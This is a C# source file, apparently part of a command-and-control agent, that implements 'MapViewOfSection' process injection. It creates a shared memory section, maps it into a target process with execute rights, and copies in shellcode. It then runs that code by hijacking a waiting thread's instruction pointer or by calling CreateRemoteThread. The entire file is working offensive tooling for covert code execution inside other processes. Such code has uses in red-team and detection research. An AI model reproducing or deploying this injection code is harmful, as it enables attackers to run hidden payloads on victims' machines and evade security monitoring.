using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using ApolloInterop.Utils;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static Injection.Shared.Win32;

namespace Injection.Techniques.MapViewOfSection
{
    public class MapViewOfSection : InjectionTechnique
    {
        private NtCreateSection _pNtCreateSection = null!;
        private NtMapViewOfSection _pNtMapViewOfSection = null!;
        private NtUnmapViewOfSection _pNtUnmapViewOfSection = null!;

        private OpenThread _pOpenThread = null!;
        private GetThreadContext _pGetThreadContext = null!;
        private SetThreadContext _pSetThreadContext = null!;
        private NtResumeThread _pNtResumeThread = null!;
        private CreateRemoteThread _pCreateRemoteThread = null!;
        private const uint CONTEXT_FULL = 0x0010003F;

        public MapViewOfSection(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
        {
            GetFunctionPointers();
        }

        public MapViewOfSection(IAgent agent, byte[] code, IntPtr hProcess) : base(agent, code, hProcess)
        {
            GetFunctionPointers();
        }

        private void GetFunctionPointers()
        {
            _pNtCreateSection = _agent.GetApi().GetLibraryFunction<NtCreateSection>(Library.NTDLL, "NtCreateSection");
            _pNtMapViewOfSection = _agent.GetApi().GetLibraryFunction<NtMapViewOfSection>(Library.NTDLL, "NtMapViewOfSection");
            _pNtUnmapViewOfSection = _agent.GetApi().GetLibraryFunction<NtUnmapViewOfSection>(Library.NTDLL, "NtUnmapViewOfSection");

            // Thread/context functions
            _pOpenThread = _agent.GetApi().GetLibraryFunction<OpenThread>(Library.KERNEL32, "OpenThread");
            _pGetThreadContext = _agent.GetApi().GetLibraryFunction<GetThreadContext>(Library.KERNEL32, "GetThreadContext");
            _pSetThreadContext = _agent.GetApi().GetLibraryFunction<SetThreadContext>(Library.KERNEL32, "SetThreadContext");
            _pNtResumeThread = _agent.GetApi().GetLibraryFunction<NtResumeThread>(Library.NTDLL, "NtResumeThread");

            _pCreateRemoteThread = _agent.GetApi().GetLibraryFunction<CreateRemoteThread>(Library.KERNEL32, "CreateRemoteThread");
        }

        private IntPtr CreateSection(long size)
        {
            long maxSize = size;
            IntPtr sectionHandle = IntPtr.Zero;
            uint status = _pNtCreateSection(
                out sectionHandle,
                0x10000000, // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40, // PAGE_EXECUTE_READWRITE
                0x08000000, // SEC_COMMIT
                IntPtr.Zero
            );

            if (status != 0)
                throw new InvalidOperationException($"NtCreateSection failed: 0x{status:X}");

            return sectionHandle;
        }

        private IntPtr MapViewLocal(IntPtr sectionHandle, ulong viewSize)
        {
            IntPtr baseAddress = IntPtr.Zero;
            ulong vs = viewSize;
            uint status = _pNtMapViewOfSection(
                sectionHandle,
                System.Diagnostics.Process.GetCurrentProcess().Handle,
                ref baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref vs,
                2,
                0,
                0x04 // PAGE_READWRITE
            );

            if (status != 0)
                throw new InvalidOperationException($"NtMapViewOfSection(local) failed: 0x{status:X}");

            return baseAddress;
        }

        private IntPtr MapViewRemote(IntPtr sectionHandle, ulong viewSize)
        {
            IntPtr remoteAddress = IntPtr.Zero;
            ulong rvs = viewSize;
            uint status = _pNtMapViewOfSection(
                sectionHandle,
                _hProcess,
                ref remoteAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref rvs,
                2,
                0,
                0x20 // PAGE_EXECUTE_READ
            );

            if (status != 0)
                throw new InvalidOperationException($"NtMapViewOfSection(remote) failed: 0x{status:X}");

            return remoteAddress;
        }

        private void WriteShellcodeToLocal(IntPtr baseAddress)
        {
            Marshal.Copy(_code, 0, baseAddress, _code.Length);
        }

        private void HijackThreadSetRip(IntPtr hThread, uint tid, IntPtr remoteAddress)
        {
            if (IntPtr.Size != 8)
                throw new PlatformNotSupportedException("32-bit thread hijack path not implemented");

            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = CONTEXT_FULL;
            if (!_pGetThreadContext(hThread, ref ctx))
            {
                int err = Marshal.GetLastWin32Error();
                throw new InvalidOperationException($"GetThreadContext failed for TID {tid}: {err} (0x{err:X})");
            }

            ctx.Rip = (ulong)remoteAddress.ToInt64();

            if (!_pSetThreadContext(hThread, ref ctx))
            {
                int err = Marshal.GetLastWin32Error();
                throw new InvalidOperationException($"SetThreadContext failed for TID {tid}: {err} (0x{err:X})");
            }

            uint prev;
            uint resumeStatus = _pNtResumeThread(hThread, out prev);
            if (resumeStatus != 0)
            {
                throw new InvalidOperationException($"NtResumeThread failed for TID {tid}: 0x{resumeStatus:X}");
            }
        }

        private IntPtr StartShellcode(System.Diagnostics.Process proc, IntPtr remoteAddress)
        {
            if (proc.Threads.Count == 0)
                throw new InvalidOperationException($"Process {proc.Id} has no threads. Aborting.");

            if (proc.Threads.Count == 1 && proc.Threads[0].ThreadState == ThreadState.Wait)
            {
                uint tid = (uint)proc.Threads[0].Id;
                IntPtr hThread = _pOpenThread(ThreadAccessRights.THREAD_ALL_ACCESS, false, tid);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"OpenThread failed for TID {tid}");

                HijackThreadSetRip(hThread, tid, remoteAddress);
                return hThread;
            }
            else
            {
                IntPtr hThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    throw new InvalidOperationException($"CreateRemoteThread failed: {err} (0x{err:X})");
                }

                return hThread;
            }
        }

        public override bool Inject(string arguments = "")
        {
            bool bRet = true;
            IntPtr sectionHandle = IntPtr.Zero;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr remoteAddress = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            try
            {
                sectionHandle = CreateSection(_code.Length);
                baseAddress = MapViewLocal(sectionHandle, (ulong)_code.Length);
                remoteAddress = MapViewRemote(sectionHandle, (ulong)_code.Length);
                WriteShellcodeToLocal(baseAddress);

                var proc = System.Diagnostics.Process.GetProcessById(_processId);
                hThread = StartShellcode(proc, remoteAddress);
            }
            catch (Exception ex)
            {
                bRet = false;
                DebugHelp.DebugWriteLine($"MapViewOfSection Inject failed: {ex}");
            }
            finally
            {
                if (baseAddress != IntPtr.Zero)
                {
                    _pNtUnmapViewOfSection(System.Diagnostics.Process.GetCurrentProcess().Handle, baseAddress);
                }
                if (sectionHandle != IntPtr.Zero)
                {
                    _pCloseHandle(sectionHandle);
                }
                if (hThread != IntPtr.Zero)
                {
                    _pCloseHandle(hThread);
                }
            }

            return bRet;
        }
    }
}



